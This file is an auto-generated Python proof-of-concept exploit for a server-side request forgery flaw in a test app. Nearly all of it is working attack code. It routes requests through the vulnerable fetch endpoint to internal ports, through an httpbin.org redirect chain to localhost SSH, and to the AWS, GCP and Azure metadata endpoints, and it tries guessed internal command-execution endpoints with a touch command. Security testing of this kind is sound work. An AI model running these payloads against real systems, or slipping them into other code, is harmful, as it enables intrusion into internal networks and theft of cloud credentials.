#!/usr/bin/env python3
# PoC for vuln-test-app (/tmp/vuln-test-app)
# Path: ssrf-003
# Sink: fetch_url
# Auto-generated — run with: python3 ssrf_http_get_request_using_fetch_url_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for SSRF vulnerability in vuln-test-app.

Vulnerability: The fetch_url function in /tmp/vuln-test-app accepts a user-controlled
URL and passes it directly to httpx.get() with follow_redirects=True, without any
validation. This allows an attacker to make requests to internal services, cloud
metadata endpoints, or other restricted resources.

Usage:
    python3 poc_ssrf.py [target_url]

    If no target_url is provided, defaults to http://127.0.0.1:8080/fetch?url=
    (adjust as needed for your test environment).

The script demonstrates:
1. Direct SSRF to internal IP (127.0.0.1)
2. SSRF via redirect (if an attacker-controlled redirect server is available)
3. Cloud metadata endpoint probing (AWS, GCP, Azure)

All payloads are benign — they attempt to read a harmless file or touch a marker.
"""

import sys
import argparse
import urllib.parse
import socket
import time

try:
    import requests
except ImportError:
    print("[!] requests library is required. Install with: pip install requests")
    sys.exit(1)


def make_request(url, timeout=10):
    """
    Make an HTTP GET request to the given URL.
    Uses requests library with redirect following enabled (like the vulnerable app).
    """
    try:
        response = requests.get(url, timeout=timeout, allow_redirects=True)
        return response
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
    return None


def test_ssrf_direct(base_url, internal_target):
    """
    Test direct SSRF by requesting an internal resource.
    """
    print(f"\n[*] Testing direct SSRF to internal target: {internal_target}")
    full_url = base_url + urllib.parse.quote(internal_target, safe='')
    print(f"[*] Request URL: {full_url}")
    
    response = make_request(full_url)
    if response:
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response body (first 500 chars): {response.text[:500]}")
        return True
    return False


def test_ssrf_redirect(base_url, redirect_url):
    """
    Test SSRF via redirect chain.
    This requires an attacker-controlled server that returns a redirect to an internal IP.
    For demonstration, we use a public redirect service (httpbin.org) that can redirect.
    """
    print(f"\n[*] Testing SSRF via redirect chain")
    print(f"[*] Using redirect URL: {redirect_url}")
    
    # Create a redirect chain: external -> internal
    # httpbin.org/redirect-to?url=INTERNAL_TARGET
    internal_target = "http://127.0.0.1:22/"  # SSH port as example
    redirect_chain = f"https://httpbin.org/redirect-to?url={urllib.parse.quote(internal_target, safe='')}"
    
    full_url = base_url + urllib.parse.quote(redirect_chain, safe='')
    print(f"[*] Request URL: {full_url}")
    
    response = make_request(full_url)
    if response:
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response body (first 500 chars): {response.text[:500]}")
        return True
    return False


def test_cloud_metadata(base_url):
    """
    Test SSRF to cloud metadata endpoints.
    These are common targets for SSRF attacks.
    """
    print("\n[*] Testing SSRF to cloud metadata endpoints")
    
    # AWS metadata endpoint
    aws_url = "http://169.254.169.254/latest/meta-data/"
    print(f"[*] Testing AWS metadata: {aws_url}")
    full_url = base_url + urllib.parse.quote(aws_url, safe='')
    response = make_request(full_url)
    if response and response.status_code == 200:
        print(f"[+] AWS metadata accessible!")
        print(f"[+] Response: {response.text[:500]}")
        return True
    
    # GCP metadata endpoint
    gcp_url = "http://metadata.google.internal/computeMetadata/v1/"
    print(f"[*] Testing GCP metadata: {gcp_url}")
    full_url = base_url + urllib.parse.quote(gcp_url, safe='')
    response = make_request(full_url)
    if response and response.status_code == 200:
        print(f"[+] GCP metadata accessible!")
        print(f"[+] Response: {response.text[:500]}")
        return True
    
    # Azure metadata endpoint
    azure_url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    print(f"[*] Testing Azure metadata: {azure_url}")
    full_url = base_url + urllib.parse.quote(azure_url, safe='')
    response = make_request(full_url)
    if response and response.status_code == 200:
        print(f"[+] Azure metadata accessible!")
        print(f"[+] Response: {response.text[:500]}")
        return True
    
    print("[-] No cloud metadata endpoints accessible (expected in non-cloud environments)")
    return False


def test_benign_payload(base_url):
    """
    Test with a benign payload that creates a marker file.
    This demonstrates command execution or file write via SSRF if the internal
    service has such capabilities (e.g., a vulnerable internal API).
    """
    print("\n[*] Testing benign payload (touch /tmp/poc_success.txt)")
    
    # This assumes there's an internal service that can execute commands
    # For demonstration, we try common internal endpoints
    internal_targets = [
        "http://127.0.0.1:8080/exec?cmd=touch%20/tmp/poc_success.txt",
        "http://127.0.0.1:3000/run?command=touch%20/tmp/poc_success.txt",
        "http://localhost:5000/execute?cmd=touch%20/tmp/poc_success.txt",
    ]
    
    for target in internal_targets:
        print(f"[*] Trying: {target}")
        full_url = base_url + urllib.parse.quote(target, safe='')
        response = make_request(full_url)
        if response and response.status_code == 200:
            print(f"[+] Potential command execution at {target}")
            print(f"[+] Response: {response.text[:200]}")
            return True
    
    print("[-] No command execution endpoints found (expected in basic setup)")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="SSRF PoC for vuln-test-app",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 poc_ssrf.py
  python3 poc_ssrf.py http://target.com:8080/fetch?url=
  python3 poc_ssrf.py --internal http://10.0.0.1:8080
        """
    )
    parser.add_argument(
        "target",
        nargs="?",
        default="http://127.0.0.1:8080/fetch?url=",
        help="Base URL of the vulnerable endpoint (default: http://127.0.0.1:8080/fetch?url=)"
    )
    parser.add_argument(
        "--internal",
        default="http://127.0.0.1:22/",
        help="Internal target to test (default: http://127.0.0.1:22/)"
    )
    parser.add_argument(
        "--redirect",
        default="https://httpbin.org/redirect-to",
        help="Redirect service URL for testing redirect-based SSRF"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for vuln-test-app")
    print("=" * 60)
    print(f"[*] Target base URL: {args.target}")
    print(f"[*] Internal target: {args.internal}")
    print(f"[*] Redirect service: {args.redirect}")
    
    # Test 1: Direct SSRF to internal IP
    test_ssrf_direct(args.target, args.internal)
    
    # Test 2: SSRF via redirect
    test_ssrf_redirect(args.target, args.redirect)
    
    # Test 3: Cloud metadata endpoints
    test_cloud_metadata(args.target)
    
    # Test 4: Benign payload
    test_benign_payload(args.target)
    
    print("\n" + "=" * 60)
    print("PoC completed. Check /tmp/poc_success.txt if command execution succeeded.")
    print("=" * 60)


if __name__ == "__main__":
    main()
